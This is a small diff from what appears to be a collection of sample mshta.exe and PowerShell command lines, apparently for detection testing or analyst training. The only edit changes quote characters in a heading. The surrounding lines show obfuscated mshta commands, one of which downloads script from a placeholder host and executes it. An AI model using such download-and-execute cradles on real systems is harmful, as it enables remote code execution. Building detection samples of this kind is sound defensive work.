@@ -28,7 +28,7 @@ mshta.exe "javascript:var p='po'+'wer'+'shell';var w=new ActiveXObject('WScript.
 mshta.exe "vbscript:Set x=CreateObject(""MSXML2.XMLHTTP""):x.Open ""GET"",""https://api-example[.]org/data"",False:x.Send"
 ```
 
-### Mixed-signal “analyst headache” sample (very realistic)
+### Mixed-signal "analyst headache" sample (very realistic)
 ```scss
 powershell.exe -c mshta.exe "javascript:try{var a=new ActiveXObject('MSXML2.XMLHTTP');a.open('GET','https://cdn-example[.]com/r',0);a.send();if(a.status==200){Function(a.responseText)();}}catch(e){}"
 ```
